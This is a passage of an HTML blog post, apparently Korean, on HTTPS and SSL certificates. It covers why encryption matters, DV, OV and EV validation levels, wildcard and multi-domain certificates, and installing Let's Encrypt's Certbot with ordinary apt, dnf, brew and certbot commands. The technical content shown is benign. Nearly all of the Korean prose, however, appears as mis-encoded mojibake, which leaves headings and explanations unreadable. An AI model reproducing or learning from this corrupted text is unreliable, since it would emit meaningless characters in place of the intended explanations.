í•„ìˆ˜ì¸ê°€?</h3><h4 id="1-ë°ì´í„°-ì•”í˜¸í™”-ë„ì²­-ë°©ì§€"><a href="#1-ë°ì´í„°-ì•”í˜¸í™”-ë„ì²­-ë°©ì§€" class="headerlink" title="1. ë°ì´í„° ì•”í˜¸í™” - ë„ì²­ ë°©ì§€"></a>1. <strong>ë°ì´í„° ì•”í˜¸í™” - ë„ì²­ ë°©ì§€</strong></h4><p>HTTPëŠ” ëª¨ë“  ë°ì´í„°ë¥¼ í‰ë¬¸ìœ¼ë¡œ ì „ì†¡í•˜ê¸° ë•Œë¬¸ì—, ì¤‘ê°„ì ê³µê²©(Man-in-the-Middle Attack)ì„ í†µí•´ ëˆ„êµ¬ë‚˜ íŒ¨í‚·ì„ ê°€ë¡œì±„ì„œ ë‚´ìš©ì„ ì½ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë¡œê·¸ì¸ ì •ë³´, ê°œì¸ì •ë³´, ê²°ì œ ì •ë³´ ë“± ë¯¼ê°í•œ ë°ì´í„°ê°€ ë…¸ì¶œë  ìœ„í—˜ì´ ìˆìŠµë‹ˆë‹¤. HTTPSëŠ” AES, ChaCha20 ê°™ì€ ê°•ë ¥í•œ ì•”í˜¸í™” ì•Œê³ ë¦¬ì¦˜ì„ ì‚¬ìš©í•˜ì—¬ ë°ì´í„°ë¥¼ ì•”í˜¸í™”í•˜ë¯€ë¡œ, ê°€ë¡œì±„ë”ë¼ë„ ë‚´ìš©ì„ í•´ë…í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤.</p><h4 id="2-ì„œë²„-ì¸ì¦-í”¼ì‹±-ë°©ì§€"><a href="#2-ì„œë²„-ì¸ì¦-í”¼ì‹±-ë°©ì§€" class="headerlink" title="2. ì„œë²„ ì¸ì¦ - í”¼ì‹± ë°©ì§€"></a>2. <strong>ì„œë²„ ì¸ì¦ - í”¼ì‹± ë°©ì§€</strong></h4><p>SSL ì¸ì¦ì„œëŠ” ì‹ ë¢°í•  ìˆ˜ ìˆëŠ” ì¸ì¦ ê¸°ê´€(CA, Certificate Authority)ì—ì„œ ë°œê¸‰í•©ë‹ˆë‹¤. ë¸Œë¼ìš°ì €ëŠ” ì¸ì¦ì„œë¥¼ ê²€ì¦í•˜ì—¬ í˜„ì¬ ì ‘ì†í•œ ì‚¬ì´íŠ¸ê°€ ì •ë§ ì›í•˜ëŠ” ì‚¬ì´íŠ¸ì¸ì§€ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ì•…ì˜ì ì¸ ì‚¬ì´íŠ¸ê°€ ì •ìƒì ì¸ ì‚¬ì´íŠ¸ë¥¼ ì‚¬ì¹­í•˜ëŠ” í”¼ì‹± ê³µê²©ì„ ë°©ì§€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><h4 id="3-ë°ì´í„°-ë¬´ê²°ì„±-ë³€ì¡°-ë°©ì§€"><a href="#3-ë°ì´í„°-ë¬´ê²°ì„±-ë³€ì¡°-ë°©ì§€" class="headerlink" title="3. ë°ì´í„° ë¬´ê²°ì„± - ë³€ì¡° ë°©ì§€"></a>3. <strong>ë°ì´í„° ë¬´ê²°ì„± - ë³€ì¡° ë°©ì§€</strong></h4><p>SSL&#x2F;TLSëŠ” HMAC(Hash-based Message Authentication Code)ë¥¼ ì‚¬ìš©í•˜ì—¬ ì „ì†¡ ì¤‘ì¸ ë°ì´í„°ê°€ ë³€ì¡°ë˜ì§€ ì•Šì•˜ìŒì„ ë³´ì¥í•©ë‹ˆë‹¤. ê³µê²©ìê°€ íŒ¨í‚·ì„ ê°€ë¡œì±„ì„œ ë‚´ìš©ì„ ìˆ˜ì •í•˜ë”ë¼ë„, ìˆ˜ì‹ ìëŠ” ì´ë¥¼ ê°ì§€í•˜ê³  ê±°ë¶€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><h4 id="4-SEO-ë°-ê²€ìƒ‰-ìˆœìœ„"><a href="#4-SEO-ë°-ê²€ìƒ‰-ìˆœìœ„" class="headerlink" title="4. SEO ë° ê²€ìƒ‰ ìˆœìœ„"></a>4. <strong>SEO ë° ê²€ìƒ‰ ìˆœìœ„</strong></h4><p>2014ë…„ë¶€í„° Googleì€ HTTPSë¥¼ ê²€ìƒ‰ ìˆœìœ„ ê²°ì • ìš”ì†Œë¡œ ì‚¬ìš©í•˜ê¸° ì‹œì‘í–ˆìŠµë‹ˆë‹¤. ë™ì¼í•œ í’ˆì§ˆì˜ ì½˜í…ì¸ ë¼ë©´ HTTPS ì‚¬ì´íŠ¸ê°€ HTTP ì‚¬ì´íŠ¸ë³´ë‹¤ ë†’ì€ ìˆœìœ„ë¥¼ ë°›ê²Œ ë©ë‹ˆë‹¤. ë˜í•œ Google Search Consoleì—ì„œëŠ” HTTPS ì‚¬ì´íŠ¸ì— ëŒ€í•œ ë” ë§ì€ ë¶„ì„ ë°ì´í„°ë¥¼ ì œê³µí•©ë‹ˆë‹¤.</p><h4 id="5-ë¸Œë¼ìš°ì €-ìš”êµ¬ì‚¬í•­-ë°-ì‚¬ìš©ì-ì‹ ë¢°"><a href="#5-ë¸Œë¼ìš°ì €-ìš”êµ¬ì‚¬í•­-ë°-ì‚¬ìš©ì-ì‹ ë¢°" class="headerlink" title="5. ë¸Œë¼ìš°ì € ìš”êµ¬ì‚¬í•­ ë° ì‚¬ìš©ì ì‹ ë¢°"></a>5. <strong>ë¸Œë¼ìš°ì € ìš”êµ¬ì‚¬í•­ ë° ì‚¬ìš©ì ì‹ ë¢°</strong></h4><p>Chrome, Firefox, Safari ë“± ì£¼ìš” ë¸Œë¼ìš°ì €ëŠ” HTTP ì‚¬ì´íŠ¸ì— â€œì•ˆì „í•˜ì§€ ì•ŠìŒâ€ ê²½ê³ ë¥¼ í‘œì‹œí•©ë‹ˆë‹¤. íŠ¹íˆ ë¡œê·¸ì¸ í¼ì´ë‚˜ ê²°ì œ í˜ì´ì§€ê°€ ìˆëŠ” HTTP ì‚¬ì´íŠ¸ëŠ” ë”ìš± ê°•ë ¥í•œ ê²½ê³ ë¥¼ ë³´ì—¬ì¤ë‹ˆë‹¤. ì‚¬ìš©ìë“¤ì€ ì´ëŸ¬í•œ ê²½ê³ ë¥¼ ë³´ê³  ì‚¬ì´íŠ¸ë¥¼ ì´íƒˆí•  ê°€ëŠ¥ì„±ì´ ë†’ì•„, ë¹„ì¦ˆë‹ˆìŠ¤ì— ì§ì ‘ì ì¸ ì˜í–¥ì„ ë¯¸ì¹©ë‹ˆë‹¤.</p><h4 id="6-ìµœì‹ -ì›¹-ê¸°ëŠ¥-í™œìš©"><a href="#6-ìµœì‹ -ì›¹-ê¸°ëŠ¥-í™œìš©" class="headerlink" title="6. ìµœì‹  ì›¹ ê¸°ëŠ¥ í™œìš©"></a>6. <strong>ìµœì‹  ì›¹ ê¸°ëŠ¥ í™œìš©</strong></h4><p>HTTP&#x2F;2, HTTP&#x2F;3, Service Workers, Progressive Web Apps(PWA), Geolocation API ë“± ë§ì€ ìµœì‹  ì›¹ ê¸°ëŠ¥ë“¤ì€ HTTPSë¥¼ í•„ìˆ˜ë¡œ ìš”êµ¬í•©ë‹ˆë‹¤. HTTPS ì—†ì´ëŠ” í˜„ëŒ€ì ì¸ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì„ êµ¬ì¶•í•˜ëŠ” ê²ƒì´ ì‚¬ì‹¤ìƒ ë¶ˆê°€ëŠ¥í•©ë‹ˆë‹¤.</p><h4 id="7-ê·œì œ-ì¤€ìˆ˜"><a href="#7-ê·œì œ-ì¤€ìˆ˜" class="headerlink" title="7. ê·œì œ ì¤€ìˆ˜"></a>7. <strong>ê·œì œ ì¤€ìˆ˜</strong></h4><p>PCI DSS(Payment Card Industry Data Security Standard), GDPR(General Data Protection Regulation), HIPAA(Health Insurance Portability and Accountability Act) ë“± ë§ì€ ë³´ì•ˆ ë° ê°œì¸ì •ë³´ ë³´í˜¸ ê·œì •ì—ì„œ ë¯¼ê°í•œ ë°ì´í„° ì „ì†¡ ì‹œ ì•”í˜¸í™”ë¥¼ ì˜ë¬´í™”í•˜ê³  ìˆìŠµë‹ˆë‹¤.</p><h2 id="SSL-ì¸ì¦ì„œ-ì¢…ë¥˜"><a href="#SSL-ì¸ì¦ì„œ-ì¢…ë¥˜" class="headerlink" title="SSL ì¸ì¦ì„œ ì¢…ë¥˜"></a>SSL ì¸ì¦ì„œ ì¢…ë¥˜</h2><p>SSL ì¸ì¦ì„œëŠ” ê²€ì¦ ìˆ˜ì¤€ê³¼ ì ìš© ë²”ìœ„ì— ë”°ë¼ ì—¬ëŸ¬ ì¢…ë¥˜ë¡œ ë‚˜ë‰©ë‹ˆë‹¤. ê° ì¸ì¦ì„œëŠ” ì„œë¡œ ë‹¤ë¥¸ ë³´ì•ˆ ìˆ˜ì¤€ê³¼ ë¹„ìš©, ë°œê¸‰ ì†ë„ë¥¼ ê°€ì§€ë¯€ë¡œ, ì›¹ì‚¬ì´íŠ¸ì˜ íŠ¹ì„±ê³¼ ìš”êµ¬ì‚¬í•­ì— ë§ê²Œ ì„ íƒí•´ì•¼ í•©ë‹ˆë‹¤.</p><h3 id="ê²€ì¦-ìˆ˜ì¤€ë³„-ë¶„ë¥˜"><a href="#ê²€ì¦-ìˆ˜ì¤€ë³„-ë¶„ë¥˜" class="headerlink" title="ê²€ì¦ ìˆ˜ì¤€ë³„ ë¶„ë¥˜"></a>ê²€ì¦ ìˆ˜ì¤€ë³„ ë¶„ë¥˜</h3><h4 id="1-DV-Domain-Validation-ë„ë©”ì¸-ê²€ì¦-ì¸ì¦ì„œ"><a href="#1-DV-Domain-Validation-ë„ë©”ì¸-ê²€ì¦-ì¸ì¦ì„œ" class="headerlink" title="1. DV (Domain Validation) - ë„ë©”ì¸ ê²€ì¦ ì¸ì¦ì„œ"></a>1. <strong>DV (Domain Validation) - ë„ë©”ì¸ ê²€ì¦ ì¸ì¦ì„œ</strong></h4><p>DV ì¸ì¦ì„œëŠ” ê°€ì¥ ê¸°ë³¸ì ì¸ í˜•íƒœì˜ SSL ì¸ì¦ì„œë¡œ, ì‹ ì²­ìê°€ í•´ë‹¹ ë„ë©”ì¸ì„ ì‹¤ì œë¡œ ì†Œìœ í•˜ê³  ìˆëŠ”ì§€ë§Œ í™•ì¸í•©ë‹ˆë‹¤. ì¸ì¦ ê¸°ê´€ì€ ì´ë©”ì¼ ì¸ì¦, DNS ë ˆì½”ë“œ í™•ì¸, HTTP íŒŒì¼ ì—…ë¡œë“œ ë“±ì˜ ê°„ë‹¨í•œ ë°©ë²•ìœ¼ë¡œ ë„ë©”ì¸ ì†Œìœ ê¶Œì„ ê²€ì¦í•©ë‹ˆë‹¤.</p><p><strong>íŠ¹ì§•:</strong></p><ul><li>ë°œê¸‰ ì‹œê°„: ëª‡ ë¶„ ~ ëª‡ ì‹œê°„ (ìë™í™”ëœ í”„ë¡œì„¸ìŠ¤)</li><li>ê°€ê²©: ë¬´ë£Œ ~ ì €ë ´ (Letâ€™s EncryptëŠ” ì™„ì „ ë¬´ë£Œ)</li><li>ê²€ì¦ ìˆ˜ì¤€: ë‚®ìŒ (ë„ë©”ì¸ ì†Œìœ ê¶Œë§Œ í™•ì¸)</li><li>ë¸Œë¼ìš°ì € í‘œì‹œ: ê¸°ë³¸ ìë¬¼ì‡  ì•„ì´ì½˜</li></ul><p><strong>ì í•©í•œ ì‚¬ìš©ì²˜:</strong></p><ul><li>ê°œì¸ ë¸”ë¡œê·¸</li><li>ì†Œê·œëª¨ ì›¹ì‚¬ì´íŠ¸</li><li>ê°œë°œ&#x2F;í…ŒìŠ¤íŠ¸ í™˜ê²½</li><li>ë¹„ìƒì—…ì  ì‚¬ì´íŠ¸</li></ul><p><strong>ëŒ€í‘œ ì‚¬ë¡€:</strong> Letâ€™s Encrypt, Cloudflare SSL, AWS Certificate Manager</p><h4 id="2-OV-Organization-Validation-ì¡°ì§-ê²€ì¦-ì¸ì¦ì„œ"><a href="#2-OV-Organization-Validation-ì¡°ì§-ê²€ì¦-ì¸ì¦ì„œ" class="headerlink" title="2. OV (Organization Validation) - ì¡°ì§ ê²€ì¦ ì¸ì¦ì„œ"></a>2. <strong>OV (Organization Validation) - ì¡°ì§ ê²€ì¦ ì¸ì¦ì„œ</strong></h4><p>OV ì¸ì¦ì„œëŠ” ë„ë©”ì¸ ì†Œìœ ê¶Œë¿ë§Œ ì•„ë‹ˆë¼ ì‹ ì²­ ì¡°ì§ì˜ ì‹¤ì²´ë„ ê²€ì¦í•©ë‹ˆë‹¤. ì¸ì¦ ê¸°ê´€ì€ ì‚¬ì—…ìë“±ë¡ì¦, ë²•ì¸ë“±ë¡ì¦ ë“±ì˜ ê³µì‹ ë¬¸ì„œë¥¼ í™•ì¸í•˜ê³ , ì „í™”ë‚˜ ì´ë©”ì¼ë¡œ ì¡°ì§ì˜ ì‹¤ì¬ë¥¼ í™•ì¸í•©ë‹ˆë‹¤.</p><p><strong>íŠ¹ì§•:</strong></p><ul><li>ë°œê¸‰ ì‹œê°„: 1~3ì¼ (ìˆ˜ë™ ê²€ì¦ í•„ìš”)</li><li>ê°€ê²©: ì—°ê°„ 50~200ë‹¬ëŸ¬</li><li>ê²€ì¦ ìˆ˜ì¤€: ì¤‘ê°„ (ì¡°ì§ ì •ë³´ ê²€ì¦)</li><li>ë¸Œë¼ìš°ì € í‘œì‹œ: ìë¬¼ì‡  ì•„ì´ì½˜ + ì¸ì¦ì„œì—ì„œ ì¡°ì§ ì •ë³´ í™•ì¸ ê°€ëŠ¥</li></ul><p><strong>ì í•©í•œ ì‚¬ìš©ì²˜:</strong></p><ul><li>ê¸°ì—… ê³µì‹ ì›¹ì‚¬ì´íŠ¸</li><li>B2B ì„œë¹„ìŠ¤</li><li>ê³ ê° ì •ë³´ë¥¼ ë‹¤ë£¨ëŠ” ì‚¬ì´íŠ¸</li><li>ì‹ ë¢°ë„ê°€ ì¤‘ìš”í•œ ë¹„ì¦ˆë‹ˆìŠ¤</li></ul><p><strong>ëŒ€í‘œ ì‚¬ë¡€:</strong> Sectigo OV, DigiCert OV, GlobalSign OV</p><h4 id="3-EV-Extended-Validation-í™•ì¥-ê²€ì¦-ì¸ì¦ì„œ"><a href="#3-EV-Extended-Validation-í™•ì¥-ê²€ì¦-ì¸ì¦ì„œ" class="headerlink" title="3. EV (Extended Validation) - í™•ì¥ ê²€ì¦ ì¸ì¦ì„œ"></a>3. <strong>EV (Extended Validation) - í™•ì¥ ê²€ì¦ ì¸ì¦ì„œ</strong></h4><p>EV ì¸ì¦ì„œëŠ” ê°€ì¥ ì—„ê²©í•œ ê²€ì¦ ê³¼ì •ì„ ê±°ì¹˜ëŠ” ì¸ì¦ì„œì…ë‹ˆë‹¤. ì¸ì¦ ê¸°ê´€ì€ ì¡°ì§ì˜ ë²•ì  ì‹¤ì²´, ë¬¼ë¦¬ì  ìœ„ì¹˜, ìš´ì˜ ìƒíƒœ ë“±ì„ ì² ì €íˆ ê²€ì¦í•˜ë©°, CA&#x2F;Browser Forumì—ì„œ ì •í•œ ì—„ê²©í•œ ê°€ì´ë“œë¼ì¸ì„ ë”°ë¦…ë‹ˆë‹¤.</p><p><strong>íŠ¹ì§•:</strong></p><ul><li>ë°œê¸‰ ì‹œê°„: 3~7ì¼ (ë§¤ìš° ì—„ê²©í•œ ê²€ì¦)</li><li>ê°€ê²©: ì—°ê°„ 150~500ë‹¬ëŸ¬</li><li>ê²€ì¦ ìˆ˜ì¤€: ìµœê³  (ì¡°ì§ì˜ ëª¨ë“  ì¸¡ë©´ ê²€ì¦)</li><li>ë¸Œë¼ìš°ì € í‘œì‹œ: ê³¼ê±°ì—ëŠ” ì£¼ì†Œì°½ì— íšŒì‚¬ëª…ì´ ë…¹ìƒ‰ìœ¼ë¡œ í‘œì‹œë˜ì—ˆìœ¼ë‚˜, í˜„ì¬ëŠ” ìë¬¼ì‡  í´ë¦­ ì‹œ ì¡°ì§ ì •ë³´ í‘œì‹œ</li></ul><p><strong>ì í•©í•œ ì‚¬ìš©ì²˜:</strong></p><ul><li>ì€í–‰, ê¸ˆìœµ ê¸°ê´€</li><li>ì „ììƒê±°ë˜ ì‚¬ì´íŠ¸</li><li>ê²°ì œ ì²˜ë¦¬ ì‹œìŠ¤í…œ</li><li>ê³ ê° ì‹ ë¢°ê°€ ë§¤ìš° ì¤‘ìš”í•œ ì„œë¹„ìŠ¤</li></ul><p><strong>ì°¸ê³ :</strong> 2019ë…„ ì´í›„ ì£¼ìš” ë¸Œë¼ìš°ì €ë“¤ì´ ì£¼ì†Œì°½ì˜ EV í‘œì‹œë¥¼ ì œê±°í•˜ë©´ì„œ, EV ì¸ì¦ì„œì˜ ì‹¤ì§ˆì  ê°€ì¹˜ì— ëŒ€í•œ ë…¼ë€ì´ ìˆìŠµë‹ˆë‹¤. ë§ì€ ê¸°ì—…ë“¤ì´ ë¹„ìš© ëŒ€ë¹„ íš¨ê³¼ë¥¼ ê³ ë ¤í•˜ì—¬ OV ì¸ì¦ì„œë¡œ ì „í™˜í•˜ê³  ìˆìŠµë‹ˆë‹¤.</p><h3 id="ë„ë©”ì¸-ë²”ìœ„ë³„-ë¶„ë¥˜"><a href="#ë„ë©”ì¸-ë²”ìœ„ë³„-ë¶„ë¥˜" class="headerlink" title="ë„ë©”ì¸ ë²”ìœ„ë³„ ë¶„ë¥˜"></a>ë„ë©”ì¸ ë²”ìœ„ë³„ ë¶„ë¥˜</h3><h4 id="1-ë‹¨ì¼-ë„ë©”ì¸-Single-Domain-ì¸ì¦ì„œ"><a href="#1-ë‹¨ì¼-ë„ë©”ì¸-Single-Domain-ì¸ì¦ì„œ" class="headerlink" title="1. ë‹¨ì¼ ë„ë©”ì¸ (Single Domain) ì¸ì¦ì„œ"></a>1. <strong>ë‹¨ì¼ ë„ë©”ì¸ (Single Domain) ì¸ì¦ì„œ</strong></h4><p>í•˜ë‚˜ì˜ íŠ¹ì • ë„ë©”ì¸(ì˜ˆ: example.com ë˜ëŠ” <a href="http://www.example.com)ë§Œ/">www.example.com)ë§Œ</a> ë³´í˜¸í•©ë‹ˆë‹¤. ê°€ì¥ ê¸°ë³¸ì ì´ê³  ì €ë ´í•œ í˜•íƒœì…ë‹ˆë‹¤.</p><p><strong>ì˜ˆì‹œ:</strong></p><ul><li>example.comì„ ìœ„í•œ ì¸ì¦ì„œëŠ” example.comë§Œ ë³´í˜¸</li><li><a href="http://www.example.comê³¼ëŠ”/">www.example.comê³¼ëŠ”</a> ë³„ê°œë¡œ ì·¨ê¸‰ë¨</li><li>ëŒ€ë¶€ë¶„ì˜ CAëŠ” wwwë¥¼ ìë™ìœ¼ë¡œ í¬í•¨ì‹œì¼œì£¼ì§€ë§Œ, í•­ìƒ í™•ì¸ í•„ìš”</li></ul><p><strong>ë¹„ìš©:</strong> ê°€ì¥ ì €ë ´ (Letâ€™s EncryptëŠ” ë¬´ë£Œ)</p><h4 id="2-ì™€ì¼ë“œì¹´ë“œ-Wildcard-ì¸ì¦ì„œ"><a href="#2-ì™€ì¼ë“œì¹´ë“œ-Wildcard-ì¸ì¦ì„œ" class="headerlink" title="2. ì™€ì¼ë“œì¹´ë“œ (Wildcard) ì¸ì¦ì„œ"></a>2. <strong>ì™€ì¼ë“œì¹´ë“œ (Wildcard) ì¸ì¦ì„œ</strong></h4><p>íŠ¹ì • ë„ë©”ì¸ì˜ ëª¨ë“  1ë‹¨ê³„ ì„œë¸Œë„ë©”ì¸ì„ ë³´í˜¸í•©ë‹ˆë‹¤. <code>*.example.com</code> í˜•íƒœë¡œ ë°œê¸‰ë˜ë©°, ì„œë¸Œë„ë©”ì¸ì„ ìì£¼ ì¶”ê°€í•˜ëŠ” ê²½ìš° ë§¤ìš° ìœ ìš©í•©ë‹ˆë‹¤.</p><p><strong>ë³´í˜¸ ë²”ìœ„:</strong></p><ul><li>âœ… api.example.com</li><li>âœ… blog.example.com</li><li>âœ… shop.example.com</li><li>âŒ example.com (ë£¨íŠ¸ ë„ë©”ì¸ì€ ë³„ë„ë¡œ ì¶”ê°€í•´ì•¼ í•¨)</li><li>âŒ sub.api.example.com (2ë‹¨ê³„ ì„œë¸Œë„ë©”ì¸ì€ ë³´í˜¸ ì•ˆ ë¨)</li></ul><p><strong>ë°œê¸‰ ë°©ë²•:</strong></p><ul><li>DV ì¸ì¦ì„œë¡œë§Œ ë°œê¸‰ ê°€ëŠ¥ (DNS ì¸ì¦ í•„ìˆ˜)</li><li>Letâ€™s Encryptì—ì„œ ë¬´ë£Œ ë°œê¸‰ ê°€ëŠ¥í•˜ë‚˜, DNS API ì—°ë™ í•„ìš”</li></ul><p><strong>ë¹„ìš©:</strong> ë‹¨ì¼ ë„ë©”ì¸ë³´ë‹¤ 2~3ë°° ë¹„ìŒˆ</p><p><strong>ì‚¬ìš© ì‚¬ë¡€:</strong></p><ul><li>ë§ˆì´í¬ë¡œì„œë¹„ìŠ¤ ì•„í‚¤í…ì²˜ (ê° ì„œë¹„ìŠ¤ë§ˆë‹¤ ì„œë¸Œë„ë©”ì¸ ì‚¬ìš©)</li><li>ë©€í‹°í…Œë„ŒíŠ¸ SaaS (ê³ ê°ì‚¬ë§ˆë‹¤ ì„œë¸Œë„ë©”ì¸ í• ë‹¹)</li><li>ê°œë°œ&#x2F;ìŠ¤í…Œì´ì§•&#x2F;í”„ë¡œë•ì…˜ í™˜ê²½ (dev.example.com, staging.example.com ë“±)</li></ul><h4 id="3-ë©€í‹°-ë„ë©”ì¸-SAN-UCC-ì¸ì¦ì„œ"><a href="#3-ë©€í‹°-ë„ë©”ì¸-SAN-UCC-ì¸ì¦ì„œ" class="headerlink" title="3. ë©€í‹° ë„ë©”ì¸ (SAN&#x2F;UCC) ì¸ì¦ì„œ"></a>3. <strong>ë©€í‹° ë„ë©”ì¸ (SAN&#x2F;UCC) ì¸ì¦ì„œ</strong></h4><p>SAN(Subject Alternative Name) ë˜ëŠ” UCC(Unified Communications Certificate)ë¼ê³  ë¶ˆë¦¬ë©°, ì™„ì „íˆ ë‹¤ë¥¸ ì—¬ëŸ¬ ë„ë©”ì¸ì„ í•˜ë‚˜ì˜ ì¸ì¦ì„œë¡œ ë³´í˜¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><strong>ë³´í˜¸ ë²”ìœ„ ì˜ˆì‹œ:</strong></p><ul><li>example.com</li><li>example.net</li><li>example.org</li><li><a href="http://www.example.com/">www.example.com</a></li><li>shop.anotherdomain.com</li></ul><p><strong>íŠ¹ì§•:</strong></p><ul><li>ì¼ë°˜ì ìœ¼ë¡œ 3~100ê°œì˜ ë„ë©”ì¸ ì§€ì›</li><li>ë„ë©”ì¸ ì¶”ê°€&#x2F;ì œê±° ì‹œ ì¸ì¦ì„œ ì¬ë°œê¸‰ í•„ìš”</li><li>ê´€ë¦¬ í¬ì¸íŠ¸ê°€ í•˜ë‚˜ë¡œ í†µí•©ë¨</li></ul><p><strong>ë¹„ìš©:</strong> ë„ë©”ì¸ ê°œìˆ˜ì— ë”°ë¼ ì¦ê°€</p><p><strong>ì‚¬ìš© ì‚¬ë¡€:</strong></p><ul><li>ì—¬ëŸ¬ ë¸Œëœë“œë¥¼ ìš´ì˜í•˜ëŠ” ê¸°ì—…</li><li>ë ˆê±°ì‹œ ì‹œìŠ¤í…œ í†µí•©</li><li>Microsoft Exchange, Office 365 í™˜ê²½</li></ul><h2 id="ë°©ë²•-1-Letâ€™s-Encrypt-ë¬´ë£Œ"><a href="#ë°©ë²•-1-Letâ€™s-Encrypt-ë¬´ë£Œ" class="headerlink" title="ë°©ë²• 1: Letâ€™s Encrypt (ë¬´ë£Œ)"></a>ë°©ë²• 1: Letâ€™s Encrypt (ë¬´ë£Œ)</h2><p>Letâ€™s EncryptëŠ” 2016ë…„ì— ì‹œì‘ëœ ë¹„ì˜ë¦¬ ì¸ì¦ ê¸°ê´€(CA)ìœ¼ë¡œ, ëˆ„êµ¬ë‚˜ ë¬´ë£Œë¡œ SSL&#x2F;TLS ì¸ì¦ì„œë¥¼ ë°œê¸‰ë°›ì„ ìˆ˜ ìˆë„ë¡ í•˜ëŠ” ê²ƒì„ ëª©í‘œë¡œ í•©ë‹ˆë‹¤. Mozilla, Cisco, Facebook, Google ë“± ì£¼ìš” ê¸°ì—…ë“¤ì˜ í›„ì›ìœ¼ë¡œ ìš´ì˜ë˜ë©°, ì „ ì„¸ê³„ ìˆ˜ì–µ ê°œì˜ ì›¹ì‚¬ì´íŠ¸ì—ì„œ ì‚¬ìš©ë˜ê³  ìˆìŠµë‹ˆë‹¤.</p><h3 id="Letâ€™s-Encryptì˜-íŠ¹ì§•"><a href="#Letâ€™s-Encryptì˜-íŠ¹ì§•" class="headerlink" title="Letâ€™s Encryptì˜ íŠ¹ì§•"></a>Letâ€™s Encryptì˜ íŠ¹ì§•</h3><p><strong>ì¥ì :</strong></p><ul><li><strong>ì™„ì „ ë¬´ë£Œ</strong>: ë°œê¸‰, ê°±ì‹ , ê´€ë¦¬ ë¹„ìš©ì´ ì „í˜€ ì—†ìŠµë‹ˆë‹¤</li><li><strong>ìë™í™”</strong>: ACME(Automatic Certificate Management Environment) í”„ë¡œí† ì½œì„ í†µí•œ ìë™ ë°œê¸‰ ë° ê°±ì‹ </li><li><strong>ì‹ ë¢°ì„±</strong>: ëª¨ë“  ì£¼ìš” ë¸Œë¼ìš°ì €ì—ì„œ ì‹ ë¢°í•˜ëŠ” ì¸ì¦ì„œ</li><li><strong>ê°„í¸í•¨</strong>: Certbot ê°™ì€ ë„êµ¬ë¡œ ëª‡ ë¶„ ì•ˆì— ì„¤ì • ê°€ëŠ¥</li><li><strong>DV ì¸ì¦ì„œ</strong>: ë„ë©”ì¸ ê²€ì¦ ì¸ì¦ì„œë¥¼ ë¹ ë¥´ê²Œ ë°œê¸‰</li></ul><p><strong>ì œí•œì‚¬í•­:</strong></p><ul><li><strong>90ì¼ ìœ íš¨ê¸°ê°„</strong>: ë³´ì•ˆì„ ìœ„í•´ ì§§ê²Œ ì„¤ì • (ìë™ ê°±ì‹ ìœ¼ë¡œ í•´ê²°)</li><li><strong>DVë§Œ ì§€ì›</strong>: OV, EV ì¸ì¦ì„œëŠ” ë°œê¸‰ ë¶ˆê°€</li><li><strong>Rate Limiting</strong>: ê°™ì€ ë„ë©”ì¸ì— ëŒ€í•´ ì£¼ë‹¹ 50ê°œê¹Œì§€ë§Œ ë°œê¸‰ ê°€ëŠ¥</li><li><strong>ì™€ì¼ë“œì¹´ë“œ ì œí•œ</strong>: DNS ì±Œë¦°ì§€ë§Œ ê°€ëŠ¥ (HTTP ì±Œë¦°ì§€ ë¶ˆê°€)</li></ul><p><strong>Letâ€™s Encryptê°€ ì í•©í•œ ê²½ìš°:</strong></p><ul><li>ê°œì¸ ì›¹ì‚¬ì´íŠ¸, ë¸”ë¡œê·¸</li><li>ìŠ¤íƒ€íŠ¸ì—… ë° ì¤‘ì†Œê¸°ì—… ì›¹ì‚¬ì´íŠ¸</li><li>API ì„œë²„</li><li>ê°œë°œ&#x2F;ìŠ¤í…Œì´ì§• í™˜ê²½</li><li>ë¹„ì˜ë¦¬ ì¡°ì§ ì›¹ì‚¬ì´íŠ¸</li><li>ì˜ˆì‚°ì´ ì œí•œì ì¸ í”„ë¡œì íŠ¸</li></ul><h3 id="Certbot-ì„¤ì¹˜"><a href="#Certbot-ì„¤ì¹˜" class="headerlink" title="Certbot ì„¤ì¹˜"></a>Certbot ì„¤ì¹˜</h3><h4 id="Ubuntu-Debian"><a href="#Ubuntu-Debian" class="headerlink" title="Ubuntu&#x2F;Debian"></a>Ubuntu&#x2F;Debian</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install certbot python3-certbot-nginx</span><br></pre></td></tr></table></figure><h4 id="CentOS-RHEL-8"><a href="#CentOS-RHEL-8" class="headerlink" title="CentOS&#x2F;RHEL 8"></a>CentOS&#x2F;RHEL 8</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo dnf install epel-release</span><br><span class="line">sudo dnf install certbot python3-certbot-nginx</span><br></pre></td></tr></table></figure><h4 id="macOS"><a href="#macOS" class="headerlink" title="macOS"></a>macOS</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">brew install certbot</span><br></pre></td></tr></table></figure><h3 id="ì¸ì¦ì„œ-ë°œê¸‰-ìë™-ì„¤ì •"><a href="#ì¸ì¦ì„œ-ë°œê¸‰-ìë™-ì„¤ì •" class="headerlink" title="ì¸ì¦ì„œ ë°œê¸‰ (ìë™ ì„¤ì •)"></a>ì¸ì¦ì„œ ë°œê¸‰ (ìë™ ì„¤ì •)</h3><p>Certbotì´ Nginx ì„¤ì •ì„ ìë™ìœ¼ë¡œ ìˆ˜ì •í•©ë‹ˆë‹¤.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ë‹¨ì¼ ë„ë©”ì¸</span></span><br><span class="line">sudo certbot --nginx -d example.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># ì—¬ëŸ¬ ë„ë©”ì¸ (www í¬í•¨)</span></span><br><span class="line">sudo certbot --nginx -d example.com -d www.example.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># ì™€ì¼ë“œì¹´ë“œ ì¸ì¦ì„œ (DNS ì¸ì¦ í•„ìš”)</span></span><br><span class="line">sudo certbot certonly --manual --preferred-challenges dns -d <span class="string">&quot;*.example.com&quot;</span> -d example.com</span><br></pre></td></tr></table></figure><h4 id="ìë™-ì„¤ì •-ê³¼ì •ì—ì„œ-ì„ íƒ-ì‚¬í•­"><a href="#ìë™-ì„¤ì 